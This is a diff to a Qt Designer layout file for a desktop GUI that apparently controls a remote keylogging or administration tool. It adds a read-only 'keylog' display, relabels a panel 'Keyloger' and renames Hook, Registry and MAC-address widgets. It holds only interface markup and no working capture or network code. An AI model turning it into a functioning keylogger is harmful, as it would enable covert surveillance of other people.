@@ -98,7 +98,7 @@
       <string>MAC Address</string>
      </property>
     </widget>
-    <widget class="QLineEdit" name="lineEdit_3">
+    <widget class="QLineEdit" name="mac_addr">
      <property name="readOnly">
       <bool>true</bool>
      </property>
@@ -106,16 +106,6 @@
       <string>Read only</string>
      </property>
     </widget>
-   </widget>
-   <widget class="QListView" name="listView">
-    <property name="geometry">
-     <rect>
-      <x>490</x>
-      <y>400</y>
-      <width>381</width>
-      <height>321</height>
-     </rect>
-    </property>
    </widget>
    <widget class="QLabel" name="label_5">
     <property name="geometry">
@@ -127,7 +117,7 @@
      </rect>
     </property>
     <property name="text">
-     <string>Log action</string>
+     <string>Keyloger</string>
     </property>
    </widget>
    <widget class="QScrollBar" name="verticalScrollBar">
@@ -261,6 +251,19 @@
      </property>
     </widget>
    </widget>
+   <widget class="QTextEdit" name="keylog">
+    <property name="geometry">
+     <rect>
+      <x>490</x>
+      <y>390</y>
+      <width>371</width>
+      <height>331</height>
+     </rect>
+    </property>
+    <property name="readOnly">
+     <bool>true</bool>
+    </property>
+   </widget>
   </widget>
   <widget class="QMenuBar" name="menubar">
    <property name="geometry">
@@ -275,7 +278,6 @@
     <property name="title">
      <string>New</string>
     </property>
-    <addaction name="actionConfig"/>
     <addaction name="actionConnect"/>
     <addaction name="actionDisconnect"/>
    </widget>
@@ -321,7 +323,7 @@
     <property name="title">
      <string>Registry</string>
     </property>
-    <addaction name="actionStart_2"/>
+    <addaction name="actionRegistry"/>
    </widget>
    <widget class="QMenu" name="menuPower">
     <property name="title">
@@ -355,7 +357,7 @@
       <iconset>
        <normaloff>image/16/hook.png</normaloff>image/16/hook.png</iconset>
      </property>
-     <addaction name="actionHook_2"/>
+     <addaction name="actionHook"/>
      <addaction name="actionUnhook"/>
     </widget>
     <addaction name="menuHook_Unhook_2"/>
@@ -476,7 +478,7 @@
     <string>Unlock</string>
    </property>
   </action>
-  <action name="actionHook_2">
+  <action name="actionHook">
    <property name="icon">
     <iconset>
      <normaloff>image/16/hook.png</normaloff>image/16/hook.png</iconset>
@@ -576,7 +578,7 @@
     <string>Show</string>
    </property>
   </action>
-  <action name="actionStart_2">
+  <action name="actionRegistry">
    <property name="icon">
     <iconset>
      <normaloff>image/16/kill.png</normaloff>image/16/kill.png</iconset>
